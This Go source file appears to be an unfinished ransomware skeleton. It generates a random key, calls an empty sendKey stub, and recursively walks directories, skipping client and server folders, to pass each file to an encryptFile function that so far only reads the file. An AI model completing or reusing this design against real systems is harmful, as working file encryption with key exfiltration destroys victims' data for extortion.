package main

import (
	"crypto/rand"
	"encoding/hex"
	"io/ioutil"
	"log"
)

func main() {
	key := createKey()
	sendKey(key)
	traverseDir(".")
}

func createKey() string {
	bytes := make([]byte, 64)
	_, err := rand.Read(bytes)
	if err != nil {
		log.Fatal(err)
	}
	key := hex.EncodeToString(bytes)
	return key
}

func sendKey(key string) {

}

func encryptFile(path string) {
	contents, err := ioutil.ReadFile(path)
	_ = contents
	if err != nil {
		log.Fatal(err)
	}
}

func traverseDir(path string) {
	ignore := map[string]bool{".git": true, "client": true, "go.mod": true, "server": true}
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		name := f.Name()
		if _, ok := ignore[name]; !ok {
			if f.IsDir() {
				traverseDir(path + "/" + f.Name())
			} else {
				encryptFile(path + "/" + f.Name())
			}
		}
	}

}
